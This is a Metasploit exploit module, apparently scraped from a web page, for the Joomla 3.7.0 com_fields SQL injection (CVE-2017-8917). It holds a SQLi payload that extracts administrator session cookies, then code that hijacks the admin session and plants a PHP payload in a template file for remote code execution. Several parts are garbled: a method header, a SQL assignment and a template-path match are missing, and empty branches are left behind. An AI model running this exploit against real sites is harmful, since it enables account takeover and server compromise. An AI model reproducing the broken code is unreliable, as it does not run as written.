# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HTTP::Joomla
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Joomla Component Fields SQLi Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a SQL injection vulnerability in the com_fields
        component, which was introduced to the core of Joomla in version 3.7.0.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mateus Lino&#039;, # Vulnerability discovery
          &#039;luisco100 <luisco100[at]gmail.com>&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-8917&#039; ], # SQLi
          [ &#039;EDB&#039;, &#039;42033&#039; ],
          [ &#039;URL&#039;, &#039;https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          # Arbitrary big number. The payload gets sent as POST data, so
          # really it&#039;s unlimited
          &#039;Space&#039;       => 262144, # 256k
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;Joomla 3.7.0&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;May 17 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
  end
 
  def check
    # Request using a non-existing table
    val = sqli(rand_text_alphanumeric(rand(10)+6), &#039;check&#039;)
 
    if val.nil?
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Vulnerable
    end
  end
 
 
    # SQLi will grab Super User or Administrator sessions with a valid username and userid (else they are not logged in).
    # The extra search for userid!=0 is because of our SQL data that&#039;s inserted in the session cookie history.
    # This way we make sure that&#039;s excluded and we only get real Administrator or Super User sessions.
    if option == &#039;check&#039;
      start = rand_text_alpha(5)
      start_h = start.unpack(&#039;H*&#039;)[0]
      fin = rand_text_alpha(5)
      fin_h = fin.unpack(&#039;H*&#039;)[0]
 
      sql = "(UPDATEXML(2170,CONCAT(0x2e,0x#{start_h},(SELECT MID((IFNULL(CAST(TO_BASE64(table_name) AS CHAR),0x20)),1,22) FROM information_schema.tables order by update_time DESC LIMIT 1),0x#{fin_h}),4879))"
    else
      start = rand_text_alpha(3)
      start_h = start.unpack(&#039;H*&#039;)[0]
      fin = rand_text_alpha(3)
      fin_h = fin.unpack(&#039;H*&#039;)[0]
 
    end
 
    # Retrieve cookies
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;vars_get&#039; => {
        &#039;option&#039; => &#039;com_fields&#039;,
        &#039;view&#039; => &#039;fields&#039;,
        &#039;layout&#039;=> &#039;modal&#039;,
        &#039;list[fullordering]&#039; => sql
        }
      })
 
    if res && res.code == 500 && res.body =~ /#{start}(.*)#{fin}/
      return $1
    end
    return nil
  end
 
 
  def exploit
    val = sqli(rand_text_alphanumeric(rand(10)+6), &#039;check&#039;)
    if val.nil?
    else
    end
 
    if val.nil?
      fail_with(Failure::Unknown, "#{peer}: No logged-in Administrator or Super User user found!")
    else
      auth_cookie_part = val
      print_status("#{peer} - Retrieved cookie [ #{auth_cookie_part} ]")
    end
 
    # Retrieve cookies
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;administrator&#039;, &#039;index.php&#039;)
    })
 
    if res && res.code == 200 && res.get_cookies =~ /^([a-z0-9]+)=[a-z0-9]+;/
      cookie_begin = $1
      print_status("#{peer} - Retrieved unauthenticated cookie [ #{cookie_begin} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Error retrieving unauthenticated cookie")
    end
 
    # Modify cookie to authenticated admin
    auth_cookie = cookie_begin
    auth_cookie << &#039;=&#039;
    auth_cookie << auth_cookie_part
    auth_cookie << &#039;;&#039;
 
    # Authenticated session
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;administrator&#039;, &#039;index.php&#039;),
      &#039;cookie&#039;  => auth_cookie
      })
 
    if res && res.code == 200 && res.body =~ /Control Panel -(.*?)- Administration/
      print_good("#{peer} - Successfully authenticated")
    else
      fail_with(Failure::Unknown, "#{peer} - Session failure")
    end
 
    # Retrieve template view
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;administrator&#039;, &#039;index.php&#039;),
      &#039;cookie&#039;  => auth_cookie,
      &#039;vars_get&#039; => {
        &#039;option&#039; => &#039;com_templates&#039;,
        &#039;view&#039; => &#039;templates&#039;
        }
      })
 
    # We try to retrieve and store the first template found
    if res && res.code == 200 && res.body =~ /\/administrator\/index.php\?option=com_templates&view=template&id=([0-9]+)&file=([a-zA-Z0-9=]+)/
      template_id = $1
      file_id = $2
 
      form = res.body.split(/<form action=([^\>]+) method="post" name="adminForm" id="adminForm"\>(.*)<\/form>/mi)
      input_hidden = form[2].split(/<input type="hidden"([^\>]+)\/>/mi)
      input_id = input_hidden[7].split("\"")
      input_id = input_id[1]
 
    else
      fail_with(Failure::Unknown, "Unable to retrieve template")
    end
 
 
 
    filename = rand_text_alphanumeric(rand(10)+6)
    # Create file
    print_status("#{peer} - Creating file [ #{filename}.php ]")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;administrator&#039;, &#039;index.php&#039;),
      &#039;cookie&#039;  => auth_cookie,
      &#039;vars_get&#039; => {
        &#039;option&#039; => &#039;com_templates&#039;,
        &#039;task&#039; => &#039;template.createFile&#039;,
        &#039;id&#039; => template_id,
        &#039;file&#039; => file_id,
        },
      &#039;vars_post&#039; => {
        &#039;type&#039; => &#039;php&#039;,
        &#039;address&#039; => &#039;&#039;,
        input_id => &#039;1&#039;,
        &#039;name&#039; => filename
      }
      })
 
    # Grab token
    if res && res.code == 303 && res.headers[&#039;Location&#039;]
      location = res.headers[&#039;Location&#039;]
      print_status("#{peer} - Following redirect to [ #{location} ]")
      res = send_request_cgi(
        &#039;uri&#039;    => location,
        &#039;method&#039; => &#039;GET&#039;,
        &#039;cookie&#039; => auth_cookie
      )
 
      # Retrieving template token
      if res && res.code == 200 && res.body =~ /&([a-z0-9]+)=1\">/
        token = $1
        print_status("#{peer} - Token [ #{token} ] retrieved")
      else
        fail_with(Failure::Unknown, "#{peer} - Retrieving token failed")
      end
 
        template_path = $1
        print_status("#{peer} - Template path [ #{template_path} ] retrieved")
      else
        fail_with(Failure::Unknown, "#{peer} - Unable to retrieve template path")
      end
 
    else
      fail_with(Failure::Unknown, "#{peer} - Creating file failed")
    end
 
    filename_base64 = Rex::Text.encode_base64("/#{filename}.php")
 
    # Inject payload data into file
    print_status("#{peer} - Insert payload into file [ #{filename}.php ]")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "administrator", "index.php"),
      &#039;cookie&#039;  => auth_cookie,
      &#039;vars_get&#039; => {
        &#039;option&#039; => &#039;com_templates&#039;,
        &#039;view&#039; => &#039;template&#039;,
        &#039;id&#039; => template_id,
        &#039;file&#039; => filename_base64,
        },
      &#039;vars_post&#039; => {
        &#039;jform[source]&#039; => payload.encoded,
        &#039;task&#039; => &#039;template.apply&#039;,
        token => &#039;1&#039;,
        &#039;jform[extension_id]&#039; => template_id,
        &#039;jform[filename]&#039; => "/#{filename}.php"
      }
      })
 
    if res && res.code == 303 && res.headers[&#039;Location&#039;] =~ /\/administrator\/index.php\?option=com_templates&view=template&id=#{template_id}&file=/
      print_status("#{peer} - Payload data inserted into [ #{filename}.php ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Could not insert payload into file [ #{filename}.php ]")
    end
 
    # Request payload
    register_files_for_cleanup("#{filename}.php")
    print_status("#{peer} - Executing payload")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, template_path, "#{filename}.php"),
      &#039;cookie&#039;  => auth_cookie
    })
  end
end

